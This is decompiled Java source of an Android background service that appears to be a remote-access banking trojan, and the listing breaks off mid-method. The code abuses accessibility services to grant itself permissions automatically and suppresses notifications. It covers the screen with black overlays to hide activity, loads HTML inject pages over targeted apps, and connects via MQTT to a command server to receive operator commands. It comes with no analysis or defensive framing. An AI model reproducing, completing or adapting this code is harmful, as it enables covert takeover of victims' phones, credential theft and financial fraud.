package com.com.androidrr;

import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Path;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.CallLog;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.WebView;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.agraham.reflection.Reflection;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Bit;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.keywords.constants.KeyCodes;
import anywheresoftware.b4a.objects.AdminManager;
import anywheresoftware.b4a.objects.ContentResolverWrapper;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.NotificationWrapper;
import anywheresoftware.b4a.objects.PanelWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.StringUtils;
import anywheresoftware.b4a.objects.WebViewWrapper;
import anywheresoftware.b4a.objects.collections.JSONParser;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.drawable.CanvasWrapper;
import anywheresoftware.b4a.objects.drawable.ColorDrawable;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4a.phone.CallLogWrapper;
import anywheresoftware.b4a.phone.PackageManagerWrapper;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4a.phone.PhoneEvents;
import anywheresoftware.b4a.randomaccessfile.B4XSerializator;
import anywheresoftware.b4a.sql.SQL;
import anywheresoftware.b4j.object.JavaObject;
import anywheresoftware.b4j.objects.MqttAsyncClientWrapper;
import b4a.example.dateutils;
import b4a.flm.archiverplus.ArchiverPlusZip;
import b4a.flm.overlaywdw.OverlayWindow;
import b4a.util.BClipboard;
import com.tillekesoft.accessibilityservices.AccessibilityConstants;
import com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper;
import ice.smsplus.SmsWrapper;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import org.eclipse.paho.client.mqttv3.internal.ClientDefaults;
import uk.co.martinpearman.b4a.webkit.ConsoleMessage;
import uk.co.martinpearman.b4a.webkit.DefaultWebChromeClient;
import uk.co.martinpearman.b4a.webkit.WebViewExtras;

/* loaded from: classes.dex */
public class backgroundservice extends AccessibilityEventsListenerWrapper {
    public static AccessibilityConstants _accservconstants = null;
    public static AccessibilityEventsListenerWrapper.AccessibilityEventsListener _acs = null;
    public static cls_perm_draw _cls_perm_draw1 = null;
    public static cls_perm_notification _cls_perm_notification1 = null;
    public static cls_perm_oheraps _cls_perm_oheraps1 = null;
    public static cls_perm_phneperms _cls_perm_phneperms1 = null;
    public static cls_perm_pwr _cls_perm_pwr1 = null;
    public static cls_perm_syswrte _cls_perm_syswrte1 = null;
    public static clsudpconnector _clsudpconnector1 = null;
    public static int _intcanuninstalltheapp = 0;
    public static int _inthquality = 0;
    public static boolean _isappssent = false;
    public static boolean _isdeviceappssent = false;
    public static int _isimportantviewsonly = 0;
    public static boolean _isovrsho = false;
    public static int _ispattrenlock = 0;
    public static boolean _issendhvncastexts = false;
    public static JavaObject _jo_otherfunctions = null;
    public static AdminManager _manager = null;
    public static MqttAsyncClientWrapper _mqtt = null;
    public static OverlayWindow _overlaywindow1 = null;
    public static PhoneEvents _phoneevents1 = null;
    public static Phone.PhoneId _phoneid = null;
    public static Phone.PhoneWakeState _phonewakestate1 = null;
    public static JavaObject _samsung_windowmanager = null;
    public static String _strblockedpackagename = "";
    public static List _tempsamsungpane2;
    public static boolean _working;
    static backgroundservice mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public ViewGroup panel;
    public ViewGroup panel2;
    public ViewGroup panel3;
    public View topLeftView;
    public View topLeftView2;
    public View topLeftView3;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;
    public overlay_var _overlay_var = null;

    public static void _complete(boolean z) throws Exception {
    }

    public static void _jobdone(httpjob httpjobVar) throws Exception {
    }

    public static void _mqtt_connected(boolean z) throws Exception {
    }

    public static String _send_toserver_errors(String str) throws Exception {
        return "";
    }

    public static class backgroundservice_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (backgroundservice) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) backgroundservice.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, false, BA.class);
        }
    }

    public static Class<?> getObject() {
        return backgroundservice.class;
    }

    @Override // com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper, android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA ba = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.backgroundservice");
            processBA = ba;
            if (BA.isShellModeRuntimeCheck(ba)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA ba2 = processBA;
            ba2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.backgroundservice", ba2, this._service, Float.valueOf(Common.Density));
        }
        if (ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false)) {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (backgroundservice) Create ***");
            processBA.raiseEvent(null, "service_create", new Object[0]);
        }
        processBA.runHook("oncreate", this, null);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.backgroundservice.1
            @Override // java.lang.Runnable
            public void run() {
                backgroundservice.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.backgroundservice.2
                @Override // java.lang.Runnable
                public void run() {
                    backgroundservice.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (backgroundservice) Create **");
                    backgroundservice.processBA.raiseEvent(null, "service_create", new Object[0]);
                    backgroundservice.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 1;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (backgroundservice) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (backgroundservice) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper, android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (backgroundservice) Destroy **");
        processBA.raiseEvent(null, "service_destroy", new Object[0]);
        processBA.service = null;
        mostCurrent = null;
        processBA.setActivityPaused(true);
        processBA.runHook("ondestroy", this, null);
    }

    public static String _add_o(String str, String str2, int i) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (!globalparameters._isoverlay_isshowing) {
                globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                globalparameters._strpkname = str2;
                if (str.trim().length() > 0) {
                    String replace = str.replace(".zip", "");
                    File file = Common.File;
                    File file2 = Common.File;
                    if (File.Exists(File.getDirInternal(), replace)) {
                        File file3 = Common.File;
                        File file4 = Common.File;
                        File file5 = Common.File;
                        String Combine = File.Combine(File.Combine(File.getDirInternal(), str2), "index.html");
                        globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                        if (globalparameters._isoverlay_isshowing) {
                            _ws_send_unlockscreen_overlay();
                        }
                        _ws_send_lockscreen_overlay_co_local(Combine, i, true);
                    }
                }
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69502746", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    /* JADX WARN: Multi-variable type inference failed */
    public static String _add_overlaypans() throws Exception {
        String str;
        try {
            Common.LogImpl("68781827", "Add_OverLayPans", 0);
            new Phone.PhoneWakeState();
            Phone.PhoneWakeState.KeepAlive(processBA, false);
            _writesetting("screen_brightness", 1);
            new Phone();
            PanelWrapper panelWrapper = new PanelWrapper();
            PanelWrapper panelWrapper2 = new PanelWrapper();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            int i = (int) globalparameters._getrealwidth;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            int i2 = (int) globalparameters._getrealheight;
            int i3 = Phone.getSdkVersion() >= 26 ? 2038 : 2002;
            panelWrapper.Initialize(processBA, "");
            Colors colors = Common.Colors;
            panelWrapper.setColor(-16777216);
            JavaObject javaObject = new JavaObject();
            try {
                javaObject.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i3), 776, -3});
                javaObject.SetField("gravity", 51);
                javaObject.SetField("x", 0);
                javaObject.SetField("y", 0);
                javaObject.SetField("width", Integer.valueOf(i));
                javaObject.SetField("height", 80);
                new JavaObject();
                ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}))).RunMethod("addView", new Object[]{panelWrapper.getObject(), javaObject.getObject()});
                str = "";
                try {
                    panelWrapper2.Initialize(processBA, str);
                    Colors colors2 = Common.Colors;
                    panelWrapper2.setColor(-16777216);
                    JavaObject javaObject2 = new JavaObject();
                    javaObject2.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i3), 776, -3});
                    javaObject2.SetField("gravity", 51);
                    javaObject2.SetField("x", 0);
                    javaObject2.SetField("y", Integer.valueOf(i2 - 110));
                    javaObject2.SetField("width", Integer.valueOf(i));
                    javaObject2.SetField("height", 110);
                    new JavaObject();
                    ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}))).RunMethod("addView", new Object[]{panelWrapper2.getObject(), javaObject2.getObject()});
                    OverlayWindow overlayWindow = _overlaywindow1;
                    BA ba = processBA;
                    globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                    int i4 = (int) globalparameters._getrealwidth;
                    globalparameters globalparametersVar4 = mostCurrent._globalparameters;
                    overlayWindow.Initialize(ba, 0, -30, i4, (int) globalparameters._getrealheight, "OverlayWindow1");
                    new PanelWrapper();
                    PanelWrapper panel = _overlaywindow1.getPanel();
                    Colors colors3 = Common.Colors;
                    panel.setColor(Colors.ARGB(255, 255, 255, 255));
                    ColorDrawable colorDrawable = new ColorDrawable();
                    Colors colors4 = Common.Colors;
                    colorDrawable.Initialize(-16777216, 0);
                    _overlaywindow1.getPanel().setBackground(colorDrawable.getObject());
                    PanelWrapper panelWrapper3 = new PanelWrapper();
                    panelWrapper3.Initialize(processBA, str);
                    View view = (View) panelWrapper3.getObject();
                    globalparameters globalparametersVar5 = mostCurrent._globalparameters;
                    int i5 = (int) globalparameters._getrealwidth;
                    globalparameters globalparametersVar6 = mostCurrent._globalparameters;
                    panel.AddView(view, 0, 0, i5, (int) globalparameters._getrealheight);
                    Colors colors5 = Common.Colors;
                    panelWrapper3.setColor(-16777216);
                    panelWrapper3.BringToFront();
                    PanelWrapper panelWrapper4 = new PanelWrapper();
                    panelWrapper4.Initialize(processBA, str);
                    View view2 = (View) panelWrapper4.getObject();
                    globalparameters globalparametersVar7 = mostCurrent._globalparameters;
                    int i6 = (int) globalparameters._getrealwidth;
                    globalparameters globalparametersVar8 = mostCurrent._globalparameters;
                    panel.AddView(view2, 0, 0, i6, (int) globalparameters._getrealheight);
                    Colors colors6 = Common.Colors;
                    panelWrapper4.setColor(-16777216);
                    panelWrapper4.BringToFront();
                    PanelWrapper panelWrapper5 = new PanelWrapper();
                    panelWrapper5.Initialize(processBA, str);
                    View view3 = (View) panelWrapper5.getObject();
                    globalparameters globalparametersVar9 = mostCurrent._globalparameters;
                    int i7 = (int) globalparameters._getrealwidth;
                    globalparameters globalparametersVar10 = mostCurrent._globalparameters;
                    panel.AddView(view3, 0, 0, i7, (int) globalparameters._getrealheight);
                    Colors colors7 = Common.Colors;
                    panelWrapper5.setColor(-16777216);
                    panelWrapper5.BringToFront();
                    PanelWrapper panelWrapper6 = new PanelWrapper();
                    panelWrapper6.Initialize(processBA, str);
                    View view4 = (View) panelWrapper6.getObject();
                    globalparameters globalparametersVar11 = mostCurrent._globalparameters;
                    int i8 = (int) globalparameters._getrealwidth;
                    globalparameters globalparametersVar12 = mostCurrent._globalparameters;
                    panel.AddView(view4, 0, 0, i8, (int) globalparameters._getrealheight);
                    Colors colors8 = Common.Colors;
                    panelWrapper6.setColor(-16777216);
                    panelWrapper6.BringToFront();
                    if (Common.Not(_overlaywindow1.IsOpen())) {
                        _overlaywindow1.Open();
                    }
                    Common.LogImpl("68781914", "overlay window status : " + BA.ObjectToString(Boolean.valueOf(_overlaywindow1.IsOpen())), 0);
                    _overlaywindow1.setVisible(true);
                    _overlaywindow1.setTouchMode(24);
                    _overlaywindow1.setKeepScreenOn(true);
                    Map map = new Map();
                    map.Initialize();
                    map.Put("mView1_SamsungOnly", panelWrapper.getObject());
                    map.Put("mView2_SamsungOnly", panelWrapper2.getObject());
                    panel.setTag(map.getObject());
                } catch (Exception e) {
                    e = e;
                    processBA.setLastException(e);
                    Common.LogImpl("68781929", BA.ObjectToString(Common.LastException(processBA)), 0);
                    _send_toserver_errors("Line 1019 " + Common.LastException(processBA).getMessage());
                    return str;
                }
            } catch (Exception e2) {
                e = e2;
                str = "";
            }
        } catch (Exception e3) {
            e = e3;
            str = "";
        }
        return str;
    }

    public static boolean _candrawoverlays() throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            JavaObject javaObject2 = new JavaObject();
            new Phone();
            if (Phone.getSdkVersion() < 23) {
                return true;
            }
            javaObject.InitializeContext(processBA);
            javaObject2.InitializeStatic("android.provider.Settings");
            return BA.ObjectToBoolean(javaObject2.RunMethod("canDrawOverlays", new Object[]{javaObject.getObject()}));
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64718606", BA.ObjectToString(Common.LastException(processBA)), 0);
            return false;
        }
    }

    public static boolean _canrequestpackageinstalls() throws Exception {
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeContext(processBA);
        new JavaObject();
        return BA.ObjectToBoolean(((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject.RunMethod("getPackageManager", (Object[]) Common.Null))).RunMethod("canRequestPackageInstalls", (Object[]) Common.Null));
    }

    public static boolean _canwritetosystemsettings() throws Exception {
        new Phone();
        if (Phone.getSdkVersion() < 23) {
            return true;
        }
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeContext(processBA);
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeStatic("android.provider.Settings.System");
        return BA.ObjectToBoolean(javaObject2.RunMethod("canWrite", new Object[]{javaObject.getObject()}));
    }

    public static boolean _check_if_notis() throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64784140", BA.ObjectToString(Common.LastException(processBA)), 0);
            return false;
        }
    }

    public static String _check_perms(String str, String str2, List list, Object obj) throws Exception {
        try {
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69109659", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        if (list.getSize() == 0) {
            return "";
        }
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        if (!globalparameters._is_auto_perm_hndlr) {
            return "";
        }
        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = _acs;
        clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
        accessibilityEventsListener.setintpemscounter(clsclassperms_code._intpermissionno);
        clsclassperms_code clsclassperms_codeVar2 = mostCurrent._clsclassperms_code;
        if (clsclassperms_code._intpermissionno != 6) {
            clsclassperms_code clsclassperms_codeVar3 = mostCurrent._clsclassperms_code;
            if (clsclassperms_code._intnumberoftries != 12) {
                _acs.SetIsNotiFicationBarShow(false);
                _acs.close_notificationbar();
                clsclassperms_code clsclassperms_codeVar4 = mostCurrent._clsclassperms_code;
                if (clsclassperms_code._intnumberoftries == 12) {
                    return "";
                }
                cls_perm_notification cls_perm_notificationVar = _cls_perm_notification1;
                DateTime dateTime = Common.DateTime;
                cls_perm_notificationVar._lasttimechecked = DateTime.getNow();
                cls_perm_draw cls_perm_drawVar = _cls_perm_draw1;
                DateTime dateTime2 = Common.DateTime;
                cls_perm_drawVar._lasttimechecked = DateTime.getNow();
                cls_perm_syswrte cls_perm_syswrteVar = _cls_perm_syswrte1;
                DateTime dateTime3 = Common.DateTime;
                cls_perm_syswrteVar._lasttimechecked = DateTime.getNow();
                cls_perm_oheraps cls_perm_oherapsVar = _cls_perm_oheraps1;
                DateTime dateTime4 = Common.DateTime;
                cls_perm_oherapsVar._lasttimechecked = DateTime.getNow();
                cls_perm_phneperms cls_perm_phnepermsVar = _cls_perm_phneperms1;
                DateTime dateTime5 = Common.DateTime;
                cls_perm_phnepermsVar._lasttimechecked = DateTime.getNow();
                cls_perm_pwr cls_perm_pwrVar = _cls_perm_pwr1;
                DateTime dateTime6 = Common.DateTime;
                cls_perm_pwrVar._lasttimechecked = DateTime.getNow();
                if (!_cls_perm_notification1._isclassfinished) {
                    if (!_cls_perm_notification1._is_perm_requested()) {
                        _cls_perm_notification1._request_perm();
                    } else {
                        _cls_perm_notification1._real_checker(str, str2, list, obj);
                    }
                } else if (!_cls_perm_draw1._isclassfinished) {
                    if (!_cls_perm_draw1._is_perm_requested()) {
                        _cls_perm_draw1._request_perm();
                    } else {
                        _cls_perm_draw1._real_checker(str, str2, list, obj);
                    }
                } else if (!_cls_perm_syswrte1._isclassfinished) {
                    if (!_cls_perm_syswrte1._is_perm_requested()) {
                        _cls_perm_syswrte1._request_perm();
                    } else {
                        _cls_perm_syswrte1._real_checker(str, str2, list, obj);
                    }
                } else if (!_cls_perm_oheraps1._isclassfinished) {
                    if (!_cls_perm_oheraps1._is_perm_requested()) {
                        _cls_perm_oheraps1._request_perm();
                    } else {
                        _cls_perm_oheraps1._real_checker(str, str2, list, obj);
                    }
                } else if (!_cls_perm_phneperms1._isclassfinished) {
                    if (!_cls_perm_phneperms1._is_perm_requested()) {
                        _cls_perm_phneperms1._request_perm();
                    } else {
                        _cls_perm_phneperms1._real_checker(str, str2, list, obj);
                    }
                } else if (!_cls_perm_pwr1._isclassfinished) {
                    if (!_cls_perm_pwr1._is_perm_requested()) {
                        _cls_perm_pwr1._request_perm();
                    } else {
                        _cls_perm_pwr1._real_checker(str, str2, list, obj, _getcontext());
                    }
                } else {
                    Common.LogImpl("69109609", "next", 0);
                    _acs.PerformGlobalAction(1);
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                    _cls_perm_notification1._timer_checker.setEnabled(false);
                    _cls_perm_draw1._timer_checker.setEnabled(false);
                    _cls_perm_syswrte1._timer_checker.setEnabled(false);
                    _cls_perm_oheraps1._timer_checker.setEnabled(false);
                    _cls_perm_phneperms1._timer_checker.setEnabled(false);
                    _cls_perm_pwr1._timer_checker.setEnabled(false);
                    clsclassperms_code clsclassperms_codeVar5 = mostCurrent._clsclassperms_code;
                    clsclassperms_code._intpermissionno = 6;
                    _remove_o("remove_o");
                    _cls_perm_notification1._isclassfinished = true;
                    _cls_perm_draw1._isclassfinished = true;
                    _cls_perm_syswrte1._isclassfinished = true;
                    _cls_perm_oheraps1._isclassfinished = true;
                    _cls_perm_phneperms1._isclassfinished = true;
                    _cls_perm_pwr1._isclassfinished = true;
                    _acs.PerformGlobalAction(1);
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                    Colors colors = Common.Colors;
                    Common.LogImpl("69109633", "FINISHED !!! ========", -16776961);
                }
                return "";
            }
        }
        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
        if (globalparameters._ishide_allnoties) {
            _acs.SetIsNotiFicationBarShow(false);
        } else {
            _acs.SetIsNotiFicationBarShow(true);
        }
        return "";
    }

    public static Common.ResumableSubWrapper _check_sm_app() throws Exception {
        ResumableSub_check_sm_app resumableSub_check_sm_app = new ResumableSub_check_sm_app(null);
        resumableSub_check_sm_app.resume(processBA, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_check_sm_app);
    }

    public static class ResumableSub_check_sm_app extends BA.ResumableSub {
        backgroundservice parent;
        boolean _bistrue = false;
        JavaObject _so = null;
        String _package = "";

        public ResumableSub_check_sm_app(backgroundservice backgroundserviceVar) {
            this.parent = backgroundserviceVar;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            int i;
            while (true) {
                try {
                    i = this.state;
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    backgroundservice.processBA.setLastException(e);
                }
                if (i == -1) {
                    Common.ReturnFromResumableSub(this, null);
                    return;
                }
                if (i == 0) {
                    this.state = 1;
                    this._bistrue = false;
                } else if (i == 1) {
                    this.state = 12;
                    this.catchState = 11;
                    this.state = 3;
                } else if (i == 3) {
                    this.state = 4;
                    this.catchState = 11;
                    JavaObject javaObject = new JavaObject();
                    this._so = javaObject;
                    this._package = BA.ObjectToString(javaObject.InitializeStatic("android.provider.Telephony.Sms").RunMethod("getDefaultSmsPackage", new Object[]{backgroundservice._getcontext().getObject()}));
                } else if (i == 4) {
                    this.state = 9;
                    String str = this._package;
                    B4AApplication b4AApplication = Common.Application;
                    if (!str.equals(B4AApplication.getPackageName())) {
                        this.state = 6;
                    } else {
                        this.state = 8;
                    }
                } else if (i == 6) {
                    this.state = 9;
                    this._bistrue = false;
                } else if (i == 8) {
                    this.state = 9;
                    this._bistrue = true;
                } else if (i == 9) {
                    this.state = 12;
                } else if (i == 11) {
                    this.state = 12;
                    this.catchState = 0;
                    Common.LogImpl("69306126", BA.ObjectToString(Common.LastException(backgroundservice.processBA)), 0);
                } else if (i == 12) {
                    this.state = -1;
                    this.catchState = 0;
                    Common.ReturnFromResumableSub(this, Boolean.valueOf(this._bistrue));
                    return;
                }
            }
        }
    }

    public static String _checkifserviceisenabled() throws Exception {
        try {
            Context context = (Context) _getcontext().getObject();
            Context context2 = context;
            if (AccessibilityEventsListenerWrapper.AccessibilityEventsListener.intIsAccessibilityServiceEnabled_WithCrashCheck(context, getObject()) == 0) {
                globalparameters globalparametersVar = mostCurrent._globalparameters;
                globalparameters._isaccactive = true;
            } else {
                globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                globalparameters._isaccactive = false;
                BA ba = processBA;
                main mainVar = mostCurrent._main;
                Common.CallSubDelayed2(ba, main.getObject(), "IsTheAccessibilityServiceEnabled", false);
                _createnotification_alert("Important", "Activate Permission");
            }
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64587562", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _close_systemnotis() throws Exception {
        try {
            new Phone();
            if (Phone.getSdkVersion() > 30) {
                _acs.PerformGlobalAction(15);
            }
            _jo_otherfunctions.RunMethod("checkstatusbar", new Object[]{"test"});
            IntentWrapper intentWrapper = new IntentWrapper();
            intentWrapper.Initialize("android.intent.action.CLOSE_SYSTEM_DIALOGS", "");
            Phone.SendBroadcastIntent(intentWrapper.getObject());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69764879", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 1179 " + Common.LastException(processBA).getMessage());
        }
        return "";
    }

    public static void _connect_to_server_broker() throws Exception {
        new ResumableSub_Connect_TO_Server_Broker(null).resume(processBA, null);
    }

    public static class ResumableSub_Connect_TO_Server_Broker extends BA.ResumableSub {
        MqttAsyncClientWrapper.MqttConnectOptionsWrapper _mo = null;
        boolean _success = false;
        backgroundservice parent;

        public ResumableSub_Connect_TO_Server_Broker(backgroundservice backgroundserviceVar) {
            this.parent = backgroundserviceVar;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                switch (this.state) {
                    case -1:
                        return;
                    case 0:
                        this.state = 1;
                        Common.LogImpl("65046277", "Connect_TO_Server_Broker ", 0);
                        break;
                    case 1:
                        this.state = 28;
                        if (!backgroundservice._working) {
                            break;
                        } else {
                            this.state = 3;
                            break;
                        }
                    case 3:
                        this.state = 4;
                        break;
                    case 4:
                        this.state = 9;
                        if (!backgroundservice._mqtt.IsInitialized()) {
                            break;
                        } else {
                            this.state = 6;
                            break;
                        }
                    case 6:
                        this.state = 9;
                        backgroundservice._mqtt.Close();
                        break;
                    case 9:
                        this.state = 10;
                        break;
                    case 10:
                        this.state = 13;
                        if (!backgroundservice._mqtt.IsInitialized()) {
                            break;
                        } else {
                            this.state = 12;
                            break;
                        }
                    case 12:
                        this.state = 10;
                        Common.Sleep(backgroundservice.processBA, this, 100);
                        this.state = 29;
                        return;
                    case 13:
                        this.state = 14;
                        MqttAsyncClientWrapper mqttAsyncClientWrapper = backgroundservice._mqtt;
                        BA ba2 = backgroundservice.processBA;
                        StringBuilder sb = new StringBuilder();
                        sb.append("tcp://");
                        globalparameters globalparametersVar = backgroundservice.mostCurrent._globalparameters;
                        sb.append(Common.SmartStringFormatter("", globalparameters._strcoo));
                        sb.append(":51997");
                        String sb2 = sb.toString();
                        globalparameters globalparametersVar2 = backgroundservice.mostCurrent._globalparameters;
                        mqttAsyncClientWrapper.Initialize(ba2, "mqtt", sb2, globalparameters._mydeviceid);
                        MqttAsyncClientWrapper.MqttConnectOptionsWrapper mqttConnectOptionsWrapper = new MqttAsyncClientWrapper.MqttConnectOptionsWrapper();
                        this._mo = mqttConnectOptionsWrapper;
                        mqttConnectOptionsWrapper.Initialize("serverdata", "serverdata");
                        this._mo.setCleanSession(true);
                        backgroundservice._mqtt.Connect2(this._mo.getObject());
                        Common.WaitFor("mqtt_connected", backgroundservice.processBA, this, null);
                        this.state = 30;
                        return;
                    case 14:
                        this.state = 27;
                        if (this._success) {
                            this.state = 16;
                            break;
                        } else {
                            this.state = 26;
                            break;
                        }
                    case 16:
                        this.state = 17;
                        Common.ToastMessageShow(BA.ObjectToCharSequence(""), false);
                        break;
                    case 17:
                        this.state = 24;
                        if (backgroundservice._working && backgroundservice._mqtt.getConnected()) {
                            this.state = 19;
                            break;
                        }
                        break;
                    case 19:
                        this.state = 20;
                        backgroundservice._mqtt.Subscribe("commands_FromPC", 1);
                        backgroundservice._get_myipaddress();
                        MqttAsyncClientWrapper mqttAsyncClientWrapper2 = backgroundservice._mqtt;
                        globalparameters globalparametersVar3 = backgroundservice.mostCurrent._globalparameters;
                        BA ba3 = backgroundservice.processBA;
